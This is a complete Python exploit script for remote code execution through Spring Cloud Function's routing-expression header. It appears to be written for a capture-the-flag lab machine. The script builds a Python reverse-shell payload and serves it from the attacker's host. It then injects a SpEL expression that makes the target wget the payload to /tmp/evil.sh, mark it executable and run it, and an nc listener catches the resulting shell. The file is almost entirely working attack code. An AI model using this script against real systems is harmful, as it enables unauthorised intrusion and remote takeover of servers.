import requests
import sys
import urllib3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket, time
import multiprocessing
import os

# CHANGE THIS:
target_ip = '10.10.11.204'
target_port = 8080  #port of application
attacker_ip = '10.10.16.31'        # Attacker machine IP
lport = 4245   # port for reverse shell

#Create reverse shell using python one liner reverse shell
def shell_file():
    f = open("shell.sh", "w")
    f.write(f"#!/bin/bash \n \npython3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")\'")
    f.close()

#Create HTTPServer to uplaod shell.sh to target
def server():
    httpd = HTTPServer((f'{attacker_ip}', 8000), SimpleHTTPRequestHandler)
    httpd.serve_forever()

#Shell Listener
def listen(port):
    os.system(f'nc -nlvp {lport}')

def command(command):
    headers = {
        'spring.cloud.function.routing-expression':f'T(java.lang.Runtime).getRuntime().exec("{command}")',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded',

    }

    url = f'http://{target_ip}:{target_port}/functionRouter'

    try:
        req = requests.post(url=url,headers=headers,verify=False,timeout=4)
        print(f"Invoke command: {command}")
    except requests.exceptions.RequestException:
        print('TimeOut!!!')




if __name__ == '__main__':

    #Creat Shell file
    shell_file()

    #Invoke httpserver 
    server = multiprocessing.Process(target=server, args=())
    server.daemon = True
    server.start()
    commands = [f'wget http://{attacker_ip}:8000/shell.sh -O /tmp/evil.sh', 'chmod +x /tmp/evil.sh', '/tmp/evil.sh']

    for cmd in commands:
        if cmd == commands[2]:
            #Invoke listen to catch reverse shell
            listen = multiprocessing.Process(target=listen, args=(lport,))
            listen.daemon = True
            listen.start()
            command(cmd)
            listen.join()
        else:
            command(cmd)
            time.sleep(2)